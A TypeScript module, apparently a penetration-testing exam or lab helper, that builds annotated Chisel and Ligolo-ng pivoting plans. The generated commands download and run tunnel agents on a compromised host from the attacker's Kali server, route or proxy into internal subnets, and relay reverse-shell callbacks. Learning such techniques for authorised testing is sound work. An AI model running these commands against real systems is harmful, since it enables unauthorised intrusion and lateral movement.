export type TunnelTool = "chisel" | "ligolo";
export type PivotOs = "linux" | "windows";
export type ChiselMode = "socks" | "port" | "loopback";

export type TunnelInput = {
  tool: TunnelTool;
  os: PivotOs;
  kali: string;
  pivot: string;
  filePort: string;
  chiselMode: ChiselMode;
  chiselPort: string;
  localPort: string;
  internal: string;
  internalPort: string;
  proxyPort: string;
  subnet: string;
  host: string;
  callback: boolean;
  callbackPort: string;
  penelopePort: string;
  loopback: boolean;
  loopPort: string;
};

export type Step = {
  side: "Kali" | "Pivot" | "Proxy";
  title: string;
  why: string;
  cmd: string;
};

export type GraphNode = {
  name: string;
  addr: string;
  role: string;
};

/** Two directed paths between the three machines. `backLive` is the return path. */
export type TunnelGraph = {
  kali: GraphNode;
  pivot: GraphNode;
  far: GraphNode;
  dial: string;
  reachTop: string;
  reachBottom: string;
  backUpper: string;
  backLower: string;
  backLive: boolean;
};

export type TunnelPlan = {
  summary: string;
  graph: TunnelGraph;
  steps: Step[];
  notes: string[];
};

function ipv4(value: string): string {
  const target = value.trim();
  if (!/^(?:\d{1,3}\.){3}\d{1,3}$/.test(target)) return "";
  const parts = target.split(".").map((part) => Number(part));
  if (parts.some((part) => part > 255)) return "";
  if (target === "0.0.0.0" || target === "255.255.255.255" || target === "169.254.169.254") return "";
  return target;
}

function routable(value: string): string {
  const ip = ipv4(value);
  if (!ip) return "";
  const [a, b] = ip.split(".").map(Number);
  if (a === 127 || a >= 224) return "";
  if (a === 169 && b === 254) return "";
  return ip;
}

function ipNote(raw: string, label: string): string | null {
  const text = raw.trim();
  if (!text || routable(text)) return null;
  const ip = ipv4(text);
  if (ip.startsWith("127.")) {
    return `${label} is not 127.0.0.1. That address means a different machine on Kali and on the victim. Use the loopback option for a service bound on the victim.`;
  }
  if (ip.startsWith("169.254.")) return `${label} is link-local. Use the address you can already reach.`;
  if (ip && Number(ip.split(".")[0]) >= 224) return `${label} is not a host you can dial.`;
  return `${label} is not a single IPv4 address yet.`;
}

function port(value: string): string {
  if (!/^\d+$/.test(value.trim())) return "";
  const n = Number(value);
  return n >= 1 && n <= 65535 ? String(n) : "";
}

function portNote(raw: string, label: string, fallback: string): { value: string; note: string | null } {
  const text = raw.trim();
  const value = port(text);
  if (!text) return { value: fallback, note: null };
  if (!value) return { value: fallback, note: `${label} is not a port from 1 to 65535. The command uses ${fallback} until it is.` };
  return { value, note: null };
}

function cidr(value: string): string {
  const raw = value.trim();
  const match = raw.match(/^((?:\d{1,3}\.){3}\d{1,3})\/(\d{1,2})$/);
  if (!match) return "";
  const ip = ipv4(match[1]);
  if (!ip) return "";
  const [a, b] = ip.split(".").map(Number);
  if (a === 127 || a >= 224 || (a === 169 && b === 254)) return "";
  const bits = Number(match[2]);
  if (bits < 8 || bits > 30) return "";
  return `${ip}/${bits}`;
}

function cidrNote(raw: string): string | null {
  const text = raw.trim();
  if (!text || cidr(text)) return null;
  if (text.startsWith("127.")) return "Do not route 127 into the tunnel. That black-holes Kali. The victim's loopback is the loopback option, which uses 240.0.0.1.";
  const head = text.split("/")[0] ?? "";
  const ip = ipv4(head);
  if (ip && Number(ip.split(".")[0]) >= 224) {
    return "Do not type 240.0.0.0/4 as the subnet. 240.0.0.1 is added by the loopback option, and only after start.";
  }
  return "The subnet should look like 172.16.0.0/24. One host, or a prefix outside /8 to /30, is not a route.";
}

function hostPort(ip: string, p: string): string {
  return p === "80" ? ip : `${ip}:${p}`;
}

export function tunnelPlan(input: TunnelInput): TunnelPlan {
  const kali = routable(input.kali) || "<KALI>";
  const pivot = routable(input.pivot) || "<PIVOT>";
  const file = portNote(input.filePort, "The file server port", "80");
  const notes: string[] = [];
  const kaliNote = ipNote(input.kali, "The Kali address");
  const pivotNote = ipNote(input.pivot, "The pivot address");
  if (kaliNote) notes.push(kaliNote);
  if (pivotNote) notes.push(pivotNote);
  if (file.note) notes.push(file.note);

  if (input.tool === "chisel") return chiselPlan(input, kali, pivot, file.value, notes);
  return ligoloPlan(input, kali, pivot, file.value, notes);
}

function chiselPlan(input: TunnelInput, kali: string, pivot: string, filePort: string, notes: string[]): TunnelPlan {
  const listen = portNote(input.chiselPort, "The Chisel port", "8000");
  const local = portNote(input.localPort, "The Kali local port", "8081");
  const dest = portNote(input.internalPort, "The port on the far side", "80");
  const socks = input.chiselMode === "socks";
  const loopback = input.chiselMode === "loopback";
  const far = loopback ? "127.0.0.1" : routable(input.internal) || "<INTERNAL>";
  if (listen.note) notes.push(listen.note);
  if (!socks && local.note) notes.push(local.note);
  if (!socks && dest.note) notes.push(dest.note);
  if (listen.value === filePort) notes.push("The file server and the Chisel port are the same. Move one of them, or the second bind fails.");
  if (!socks && local.value === listen.value) {
    notes.push("The Kali local port and the Chisel server port are the same. The forward cannot bind. Pick another local port.");
  }
  if (!loopback) {
    const hostNote = ipNote(input.internal, socks ? "The host to scan" : "The internal host");
    if (hostNote) notes.push(hostNote);
  } else if (!input.internalPort.trim()) {
    notes.push("Set the port bound to 127.0.0.1 on the victim. The command uses 80 until you do.");
  }

  const forward = socks ? "R:socks" : `R:${local.value}:${far}:${dest.value}`;
  const client =
    input.os === "linux"
      ? `/tmp/chisel client ${kali}:${listen.value} ${forward}`
      : `C:\\Users\\Public\\chisel.exe client ${kali}:${listen.value} ${forward}`;
  const fetchCmd =
    input.os === "linux"
      ? `curl -o /tmp/chisel http://${hostPort(kali, filePort)}/chisel && chmod +x /tmp/chisel`
      : `certutil -urlcache -split -f http://${hostPort(kali, filePort)}/chisel.exe C:\\Users\\Public\\chisel.exe`;
  const probe =
    input.os === "linux"
      ? `curl -m 3 -o /dev/null http://${hostPort(kali, filePort)}/`
      : `curl.exe -m 3 -o NUL http://${hostPort(kali, filePort)}/`;
  const binary = input.os === "linux" ? "chisel" : "chisel.exe";
  const findLoop = input.os === "linux" ? "ss -tlnp | grep 127.0.0.1" : "netstat -ano | findstr 127.0.0.1";
  const use = socks
    ? `# the last line of /etc/proxychains4.conf must be this, and the localnet skips must not cover the exam ranges\n# socks5 127.0.0.1 1080\nproxychains -q nmap -Pn -sT -p 22,80,445,3389,5985 ${far}`
    : `# On Kali, connect to 127.0.0.1 port ${local.value}\n# The pivot connects to ${far} port ${dest.value}\n# HTTP only:\ncurl -sI http://127.0.0.1:${local.value}/\n# any other protocol: point that client at 127.0.0.1 port ${local.value}`;

  const steps: Step[] = [
    {
      side: "Kali",
      title: "On Kali, start the listener and leave that window open",
      why: `Open a terminal on Kali and leave it in the foreground. chisel server binds port ${listen.value} on Kali. That is the port the pivot will dial, not a port on the pivot. --reverse is required. Without it the server refuses the R: lines, so the client connects and then nothing is forwarded. You should see the process waiting, not exiting. If the port is already taken, it dies immediately and the later client gets connection refused. Do not close this window when you move to the pivot. Closing it removes the tunnel.`,
      cmd: `chisel server -p ${listen.value} --reverse`,
    },
    {
      side: "Kali",
      title: "On Kali, check the binary, then serve it",
      why: `Open a second terminal on Kali, in the directory that contains the release file named ${binary}. file is the check before anyone downloads it. ELF 64-bit means a Linux pivot. PE32+ executable (console) x86-64 means 64-bit Windows. HTML, ASCII text, or a file of a few hundred bytes is the GitHub page saved under the tool's name. Download the release asset again. python3 -m http.server then listens on port ${filePort} on Kali, and a log line later is the proof the pivot connected. Serve only this directory. The source tree is not a working client.`,
      cmd: `file ${binary}\npython3 -m http.server ${filePort}`,
    },
    {
      side: "Pivot",
      title: "On the pivot, prove it can reach that Kali address",
      why: "Run this in the shell you already have on the pivot. The URL is your VPN address and the file-server port from the previous step. -m 3 gives up after three seconds, so a missing route cannot sit there. Success is quiet, because the body is discarded. Timeout or 'couldn't connect' means the pivot has no route to that Kali IP, and the upload will fail the same way. Stop. A tiny successful download can still be the HTML page, so the file check on Kali still matters.",
      cmd: probe,
    },
  ];

  if (loopback) {
    steps.push({
      side: "Pivot",
      title: "On the pivot, confirm the service is on its own 127.0.0.1",
      why: "Still on the pivot. Read the address in this output, not only the port. 127.0.0.1 means the service accepts connections from this host and nowhere else, which is why nmap across the VPN never saw it. 0.0.0.0 or [::] means every interface, so Kali should already have seen it and this mode is the wrong one. Copy the port from this line into the forward. Guessing 80 or 3306 forwards a closed port, and the tunnel then looks broken when the service was simply on a different number.",
      cmd: findLoop,
    });
  }

  steps.push(
    {
      side: "Pivot",
      title: socks ? "On the pivot, ask Kali for a SOCKS proxy" : loopback ? "On the pivot, forward its own 127.0.0.1" : "On the pivot, forward one port it can see",
      why: socks
        ? "The first line saves the binary onto the pivot and marks it executable. The second line is the client, and it stays in the foreground. client points at the Chisel port on Kali. R:socks tells that server to open 127.0.0.1:1080 on Kali. Anything you send there is dialed by the pivot, so the far host sees the pivot's address, not yours. You do not get a route, UDP, or a path back to Kali. A service bound only to the victim's 127.0.0.1 is the loopback mode, not this one. When it works, the server window on Kali prints a new session. Connection refused means that window is not running. A hang with no session means the reachability check failed."
        : loopback
          ? `The first line saves the binary onto the pivot. The client then stays in the foreground. R:${local.value}:127.0.0.1:${dest.value} is read on the victim: listen on Kali port ${local.value}, and from the pivot connect to its own 127.0.0.1 port ${dest.value}. 127.0.0.1 in that command is the victim, not Kali. After the session appears, Kali's 127.0.0.1:${local.value} is that service. SOCKS cannot do this hop, because a proxychains connection to 127.0.0.1 never leaves Kali. Connection refused means the server window died. A session with a closed local port means the number you forwarded was not the one ss or netstat showed.`
          : `The first line saves the binary onto the pivot. The client then stays in the foreground. R:${local.value}:${far}:${dest.value} listens on Kali port ${local.value}, and the pivot connects to ${far} port ${dest.value}. That address is from the pivot's view. It can be another interface on the pivot or a second host only the pivot can see. If that service was bound to 127.0.0.1, this mode will not hit it: use the loopback mode instead. When it works, the Kali server window prints a session. You then use 127.0.0.1:${local.value} on Kali, not ${far}.`,
      cmd: `${fetchCmd}\n${client}`,
    },
    {
      side: "Kali",
      title: socks ? "On Kali, use proxychains, and do not trust a SYN scan" : "On Kali, use the port that appeared on Kali",
      why: socks
        ? "This is a third window on Kali. A program does not enter the tunnel unless proxychains starts it. In /etc/proxychains4.conf the last uncommented line must be socks5 127.0.0.1 1080. Comment out the localnet lines for 10/8, 172.16/12, and 192.168/16 when the target sits in those ranges. Otherwise the packets go direct, the tunnel looks dead, and you still get an answer from the wrong network. nmap has to be -sT, a full connect. -sS sends raw SYN packets, which never enter a SOCKS proxy, and closed ports come back as open. Point the tool at the internal address, not at 127.0.0.1. 127.0.0.1 here is Kali."
        : `This is another window on Kali. The service is now on 127.0.0.1 port ${local.value}, which Chisel opened. Point the browser, database client, or nxc at that address. Do not point them at the pivot or at ${far}: the tunnel already made that connection. curl -sI is only a test when the far port is HTTP. SMB, MySQL, and a debug port need their own client against the same Kali port. A connection refused on this port means the client on the pivot is not running, or the far port was closed. Ctrl-C the server window when you are finished with the host.`,
      cmd: use,
    },
  );

  const graph: TunnelGraph = {
    kali: { name: "Kali", addr: kali, role: `chisel server :${listen.value}` },
    pivot: { name: "Pivot", addr: pivot, role: `${input.os} client` },
    far: socks
      ? { name: "Reached", addr: far === "<INTERNAL>" ? "hosts it can see" : far, role: "TCP via SOCKS" }
      : loopback
        ? { name: "Victim loopback", addr: `127.0.0.1:${dest.value}`, role: "not Kali's loopback" }
        : { name: "One port", addr: `${far}:${dest.value}`, role: `on Kali :${local.value}` },
    dial: `dials :${listen.value}`,
    reachTop: socks ? "SOCKS :1080" : `Kali :${local.value}`,
    reachBottom: socks ? "proxychains -sT" : loopback ? "their 127.0.0.1" : "one service",
    backUpper: "",
    backLower: "no path back",
    backLive: false,
  };

  return {
    summary: socks
      ? "Chisel SOCKS lets Kali open TCP ports on hosts the pivot can already reach. It is not a route, it cannot see a service bound to the victim's 127.0.0.1, and nothing on the far side can dial Kali."
      : loopback
        ? `Chisel puts the victim's 127.0.0.1:${dest.value} onto Kali's 127.0.0.1:${local.value}. Your tools stay on Kali and talk to Kali's loopback. The victim's loopback is a different machine.`
        : "Chisel puts one service the pivot can see onto a Kali localhost port. It does not give you the rest of the subnet, and it does not let the far side call back.",
    graph,
    steps,
    notes,
  };
}

function ligoloPlan(input: TunnelInput, kali: string, pivot: string, filePort: string, notes: string[]): TunnelPlan {
  const proxy = portNote(input.proxyPort, "The proxy port", "11601");
  const callback = portNote(input.callbackPort, "The port on the pivot", "443");
  const penelope = portNote(input.penelopePort, "The Penelope port", "443");
  const loop = portNote(input.loopPort, "The loopback port", "<PORT>");
  const subnet = cidr(input.subnet) || "<SUBNET>";
  const host = routable(input.host) || "<HOST>";
  const subnetProblem = cidrNote(input.subnet);
  if (subnetProblem) notes.push(subnetProblem);
  const hostNote = ipNote(input.host, "The host to scan");
  if (hostNote) notes.push(hostNote);
  if (proxy.note) notes.push(proxy.note);
  if (proxy.value === filePort) notes.push("The file server and the Ligolo proxy port are the same. Move one of them.");
  if (input.callback && callback.note) notes.push(callback.note);
  if (input.callback && penelope.note) notes.push(penelope.note);
  if (input.loopback && input.loopPort.trim() && loop.note) notes.push(loop.note);
  if (input.loopback && !input.loopPort.trim()) {
    notes.push("Set the port that ss or netstat showed on 127.0.0.1. 240.0.0.1 without a port is the whole loopback, which is a slow nmap.");
  }

  const binary = input.os === "linux" ? "agent" : "agent.exe";
  const fetchCmd =
    input.os === "linux"
      ? `curl -o /tmp/agent http://${hostPort(kali, filePort)}/agent && chmod +x /tmp/agent\n/tmp/agent -connect ${kali}:${proxy.value} -ignore-cert`
      : `certutil -urlcache -split -f http://${hostPort(kali, filePort)}/agent.exe C:\\Users\\Public\\agent.exe\nC:\\Users\\Public\\agent.exe -connect ${kali}:${proxy.value} -ignore-cert`;
  const probe =
    input.os === "linux"
      ? `curl -m 3 -o /dev/null http://${hostPort(kali, filePort)}/`
      : `curl.exe -m 3 -o NUL http://${hostPort(kali, filePort)}/`;
  const loopPort = input.loopPort.trim() ? loop.value : "<PORT>";

  const steps: Step[] = [
    {
      side: "Kali",
      title: "On Kali, create the tun device once per boot",
      why: "Run both lines on Kali, before the proxy, in a normal shell. The first creates a tun interface named ligolo and gives it to your user, so the proxy does not need to stay root. The second turns that interface on. If the add says file exists, an earlier attempt already created it. Leave it. Do not add a second interface, and do not delete it because a scan failed. ip link should then show ligolo, state UP. The interface alone does not route anything. That happens after start.",
      cmd: "sudo ip tuntap add user $USER mode tun ligolo\nsudo ip link set ligolo up",
    },
    {
      side: "Kali",
      title: "On Kali, start the proxy before the agent",
      why: `Run this on Kali and leave the window in the foreground. It listens on port ${proxy.value} on every interface, which is the port the agent on the pivot will dial. -selfcert writes a certificate for this run so you do not have to bring one. The agent will pass -ignore-cert to accept it. You should see the proxy waiting for a session. If the port is in use, it exits at once and the agent later gets connection refused. session and start are typed in this same window, later. They are not shell commands. Starting the agent before this window is up produces connection refused, which is the order, not a bad binary.`,
      cmd: `./proxy -selfcert -laddr 0.0.0.0:${proxy.value}`,
    },
    {
      side: "Kali",
      title: "On Kali, check the agent, then serve it",
      why: `Open another terminal on Kali, in the directory that contains the release file named ${binary}. file must say ELF for a Linux pivot or PE32+ for 64-bit Windows, and the size must match the release you downloaded. A few hundred bytes, or HTML, is the GitHub page. python3 -m http.server then listens on port ${filePort} on Kali. That port is only the download. It is not the proxy port, and the agent does not speak HTTP to it after the file is saved. A log line is the proof the pivot reached it.`,
      cmd: `file ${binary}\npython3 -m http.server ${filePort}`,
    },
    {
      side: "Pivot",
      title: "On the pivot, prove it can reach that Kali address",
      why: "Run this in the shell you already have on the pivot. The URL is your VPN address and the file-server port, not the proxy port. -m 3 gives up after three seconds. Success is quiet. Timeout or 'couldn't connect' means the agent will hang too, so do not upload it yet. A host that cannot see Kali cannot run this agent. That host has to connect to the pivot instead, which is the callback step at the end.",
      cmd: probe,
    },
    {
      side: "Pivot",
      title: "On the pivot, run the agent and leave it there",
      why: `The first line saves the agent onto the pivot. The second line connects it to ${kali} port ${proxy.value}, which is the proxy you started on Kali, and -ignore-cert accepts the certificate from -selfcert. Leave this process in the foreground. It is only a session. It does not add a route, and it does not open the subnet or the victim's 127.0.0.1. Those are the next steps, back on Kali. When it works, the proxy window prints that an agent joined. Connection refused means the proxy is not running. A hang means the reachability check failed and this hop cannot see Kali.`,
      cmd: fetchCmd,
    },
    {
      side: "Proxy",
      title: "In the proxy window on Kali, select the session, then start",
      why: "Go back to the proxy window on Kali. Do not type these in the pivot shell, and do not open a new terminal. session lists the agents and selects one. start is what attaches that session to the ligolo interface and starts carrying packets. You should see it bind the tunnel to the interface. If it says the interface is already in use, a tunnel is already on it from this session or an old one. A route you add before start points at an interface with no packets, which looks exactly like a dead subnet. Add the route only after this line succeeds.",
      cmd: "session\nstart",
    },
    {
      side: "Kali",
      title: "On Kali, route the subnet only after start",
      why: `In a normal Kali shell, after start. ip route add sends ${subnet} into the ligolo interface. That range is the one you saw on the pivot with ip a or ipconfig, not your tun0 range and not 127.0.0.0/8. After the route, nmap and nxc run as ordinary commands on Kali. You do not put proxychains in front of them, and Ligolo does not read proxychains4.conf. A timeout here means the route was added before start, the subnet is wrong, or the agent window died. Delete the route when you are finished with the subnet. Leave the tun device in place.`,
      cmd: `sudo ip route add ${subnet} dev ligolo\nnmap -Pn -sC -sV -p 22,80,445,3389,5985 ${host}\n# when finished\nsudo ip route del ${subnet}`,
    },
  ];

  if (input.loopback) {
    steps.push({
      side: "Kali",
      title: "On Kali, reach the victim's 127.0.0.1 as 240.0.0.1",
      why: `Also on Kali, after start, in the same kind of shell as the subnet route. Ligolo reserves 240.0.0.1 to mean the agent's own 127.0.0.1. Your tools use 240.0.0.1 and port ${loopPort}. They must not use 127.0.0.1, because 127.0.0.1 on Kali is Kali. Do not route 127.0.0.0/8 into the tun device. That black-holes Kali's own loopback, including the proxy and your shells. Port ${loopPort} is the port ss or netstat showed bound to 127.0.0.1 on the victim. nmap -sT is enough for one port. curl -sI is only useful when that port is HTTP.`,
      cmd: `sudo ip route add 240.0.0.1/32 dev ligolo\nnmap -Pn -sT -p ${loopPort} 240.0.0.1\n# HTTP only:\ncurl -sI http://240.0.0.1:${loopPort}/`,
    });
  }

  if (input.callback) {
    steps.push({
      side: "Proxy",
      title: "In the proxy window, open a callback port on the pivot",
      why: `Type this in the proxy window on Kali, after start. The route lets you reach the far subnet. It does not let those hosts reach your VPN address, so a payload aimed at Kali will time out. listener_add opens port ${callback.value} on the pivot, on every interface, and forwards it to 127.0.0.1 port ${penelope.value} on Kali, where Penelope is already listening. The payload's LHOST is ${pivot}, the pivot, and LPORT is ${callback.value}. It is not ${kali} and it is not 127.0.0.1. listener_list should show the listener. If the pivot already serves something on ${callback.value}, the add fails or steals a real service. Pick another port on both sides.`,
      cmd: `listener_add --addr 0.0.0.0:${callback.value} --to 127.0.0.1:${penelope.value} --tcp\nlistener_list`,
    });
  }

  const graph: TunnelGraph = {
    kali: { name: "Kali", addr: kali, role: `tun ligolo · ${subnet}` },
    pivot: { name: "Pivot", addr: pivot, role: `${input.os} agent` },
    far: input.loopback && subnet === "<SUBNET>"
      ? { name: "Victim loopback", addr: "240.0.0.1", role: "their 127.0.0.1" }
      : { name: "Subnet", addr: subnet, role: host === "<HOST>" ? "normal tools" : host },
    dial: `dials :${proxy.value}`,
    reachTop: "route on tun",
    reachBottom: input.loopback ? "240.0.0.1 too" : "no proxychains",
    backUpper: input.callback ? `Penelope :${penelope.value}` : "",
    backLower: input.callback ? `to pivot :${callback.value}` : "no path back",
    backLive: input.callback,
  };

  const loopSentence = input.loopback
    ? " 240.0.0.1 on that interface is the victim's 127.0.0.1. Do not route 127 itself."
    : " The far side cannot dial your VPN address until you add a listener.";

  return {
    summary: input.callback
      ? `Ligolo gives Kali a real route into the subnet, plus one port on the pivot that forwards a callback to Penelope.${loopSentence}`
      : `Ligolo gives Kali a real route into one subnet. nmap and nxc run with no proxychains.${loopSentence}`,
    graph,
    steps,
    notes,
  };
}
